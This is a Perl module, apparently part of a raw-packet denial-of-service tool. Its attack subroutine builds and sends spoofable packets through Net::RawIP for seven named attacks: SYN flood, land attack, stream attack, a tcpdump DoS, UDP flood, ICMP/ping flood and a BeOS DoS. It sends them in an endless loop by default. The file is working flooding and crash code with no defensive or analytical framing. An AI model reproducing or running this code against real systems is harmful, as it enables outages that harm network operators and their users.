use vars qw(@ISA @EXPORT @EXPORT_OK);

use Exporter;
@ISA=qw(Exporter);
@EXPORT=qw(check_attack attack);

# Check if someone specified an attack and call the sub attack($attack)
# and give an error if someone specified more than one attack at once.
sub check_attack {
  my @attacks=($syn_flood, $land, $stream, $tcp_dos, $udp_flood, $ping_flood, $bedos);
  my $a_count=0, $attack_num=0;
  my $attack;

  foreach $element (@attacks) {
   
   $element++;
   if($element==2) { $attack_num++; $attack=$a_count }
   
   # So let's decrement $element now again...
   $element--;
   
   $a_count++;
  }
  
  if($attack_num>1) { help(2) } 
  if($attack_num==1) { attack($attack) }
}


# Here are the different attacks...
sub attack {
 my $attack=shift;
 my $name;
 $icount=0;
 
 # SYN flood options...
 if($attack==0) {
  $name="SYN flood"; $SYN=1; $RST=0; $PSH=0; $ACK=0; $URG=0; $FIN=0;
  $protocol=6;
 }

 # Land attack options...
 if($attack==1) {
  $name="Land attack"; $SYN=1; $RST=0; $PSH=1; $ACK=0; $URG=0; $FIN=0;
  $sport=$dport; # Source port must be the same as the destination port !!!
  $protocol=6;
 }

 # Stream attack options...
 if($attack==2) {
  $name="Stream attack"; $SYN=0; $RST=0; $PSH=0; $ACK=1; $URG=0; $FIN=0;
  $protocol=6;
 }

 # tcpdump DoS attack options...
 if($attack==3) {
  $name="tcpdump DoS attack"; $ttl=64; $protocol=4; $ihl=0; $tos=0;
 }

 # UDP flood
 if($attack==4) {
  $name="UDP flood"; $protocol=17;
 }

 # ICMP/Ping flood
 if($attack==5) {
  $name="ICMP/Ping flood"; $protocol=1; $icmptype=0; $icmpcode=0;
 }

 # BeOS DoS attack
 if($attack==6) {
  $name="BeOS DoS attack"; $protocol=6; $tot=39;
 }
  
 # Set default number of packets for the different attacks...
 # (0=loop)
 if($attack==0 or $attack==2 or $attack==4 or $attack==5) {
    if($ucount==1) { $count=0 }
 } elsif($attack==1 or $attack==3) {
    if($ucount==1) { $count=1 }
 }

 # Let's construct the packet...
  $packet=new Net::RawIP;
  $packet->set({ ip  => { ttl      => $ttl,
                          protocol => $protocol,
                          tos      => $tos,
                          saddr    => $saddr,
                          daddr    => $daddr,
			  ihl      => $ihl,
                          frag_off => $frag_off,
                          version  => $version,
                        }
	      });
	      
 if($attack<4) {
  $packet->set({ tcp => { source => $sport,
                          dest   => $dport,
                          seq    => $seq,
                          doff   => $data_off,
                          window => $window,
                          ack_seq=> $ack_seq,
                          urg_ptr=> $urg_ptr,
                          fin    => $FIN,
                          syn    => $SYN,
                          rst    => $RST,
                          psh    => $PSH,
                          ack    => $ACK,
                          urg    => $URG,
                          data   => $data,
                          res1   => $res1,
                          res2   => $res2
                       }
               });
 }
 
 if($attack==4) {
  $packet->set({ udp=> { source => $sport,
                         dest   => $dport,
                         len    => $len,
                         data   => $data
			}
	      });
 }
 
 if($attack==5) {
   $packet = new Net::RawIP ({icmp =>{}});
   $packet->set({ ip  => { ttl      => $ttl,
                           protocol => $protocol,
                           tos      => $tos,
                           saddr    => $saddr,
                           daddr    => $daddr,
                           ihl      => $ihl,
                           frag_off => $frag_off,
                           version  => $version,
                         },
                  icmp=> { type    => $icmptype,
                           code    => $icmpcode,
                           data    => $data,
			   gateway => $gateway,
			   id      => $iid,
			   sequence=> $seq,
			   mtu     => $mtu
                         }
               });
 }
 

 if($attack==6) {
  $packet->set({ ip  => { saddr    => $saddr,
                          daddr    => $daddr,
                          tot_len  => $tot,
                          protocol => $protocol
			 } });
 }
     
 
	       
  
 # IP/TCP/UDP/ICMP checksum...
 if(defined($ipcheck)) { $packet->set({ ip   => { check => $ipcheck } }) }
 if(defined($tcheck) && $protocol==6) {
  $packet->set({ tcp  => { check => $tcheck } });
 }
 if(defined($ucheck)) { $packet->set({ udp   => { check => $ucheck  } }) }
 if(defined($icheck)) { $packet->set({ icmp  => { check => $icheck  } }) }
 
 if($count==0) { $count=1; $set_count=1 }

 for($icount=0;$icount<$count;$icount++) {
  $pcount++;     # Packet counter
  
  # Let's call rand_set to generate random values...
  rand_set();

  if($set_count==1) { $icount-- }       # Loop?
  
  if(!defined($quiet)) {
   print("Attack: $name\n");
   info();
   print("\n");
  } 
  $packet->send();
 }
 
 exit(0);                               # Exit
}

1;
